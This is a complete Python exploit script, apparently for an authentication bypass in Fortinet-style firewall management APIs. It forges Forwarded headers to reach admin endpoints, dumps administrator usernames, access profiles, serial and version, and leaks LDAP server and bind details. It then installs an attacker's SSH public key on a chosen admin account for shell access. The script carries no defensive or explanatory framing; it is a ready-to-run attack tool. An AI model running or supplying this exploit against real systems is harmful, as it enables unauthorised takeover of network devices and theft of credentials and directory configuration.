import argparse
import requests
import urllib3
import json 
requests.packages.urllib3.disable_warnings()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def format_key(key_file):
    with open(key_file) as f:
        k = f.read().strip()

    return(k)

def get_usernames(url):
    headers = {
        "user-agent": "Node.js",
        "accept-encoding": "gzip, deflate",
        "Host": "127.0.0.1:9980",
        "forwarded": 'by="[127.0.0.1]:80";for="[127.0.0.1]:49490";proto=http;host=',
        "x-forwarded-vdom": "root",
    }
    try:
        r = requests.get(url + "/api/v2/cmdb/system/admin", headers=headers, verify=False)
        if(r.status_code == 200):
            
            print("\033[92m[+] The target {} is vulnerable\033[0m".format(url))
            data = json.loads(r.text)
            for user in data['results']:
                print("\033[93m[+]\033[0m Admin username: {}".format(user['name']))
                print("\033[93m[+]\033[0m Level access: {}".format(user['accprofile']))
            print("[+] Serial: {}".format(data['serial']))
            print("[+] Version: {}".format(data['version']))

            r = requests.get(url + "/api/v2/cmdb/user/ldap", headers=headers, verify=False)
            data = json.loads(r.text)
            if(len(data['results']) > 0):
                print("[+] Leaking ldap config")
                print("\033[93m[+]\033[0m LDAP server: {}".format(data['results'][0]['name']))
                print("\033[93m[+]\033[0m LDAP server: {}".format(data['results'][0]['server']))
                print("\033[93m[+]\033[0m LDAP binddn: {}".format(data['results'][0]['dn']))
                print("\033[93m[+]\033[0m LDAP username: {}".format(data['results'][0]['username']))
            return True
    except Exception as exception:
        print(exception)
    return False

def get_shell(url, username, key_file):
    headers = {
        'User-Agent': 'Report Runner',
        'Forwarded': 'for="[127.0.0.1]:8888";by="[127.0.0.1]:8888"'
    }
    key = format_key(key_file)
    j = {
        "ssh-public-key1": '\"' + key + '\"'
    }
    url = f'{url}/api/v2/cmdb/system/admin/{username}'
    try:
        r = requests.put(url, headers=headers, json=j, verify=False)
        if 'SSH key is good' in r.text:
            print(f'[+] SSH key for {username} added successfully!')
        else:
            print("[-] SSH is add error!!!")
    except Exception as exception:
        print(exception)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', help='URL路径', required=True)
    args = parser.parse_args()
    if args.url != '' and args.url != None:
        is_vul = get_usernames(args.url)
        if is_vul:
            username = input("\033[91m[*]请输入用户名\033[0m:")
            key_file = input("\033[91m[*]请输入SSH公钥id_rsa.pub路径\033[0m:")
            get_shell(args.url, username, key_file)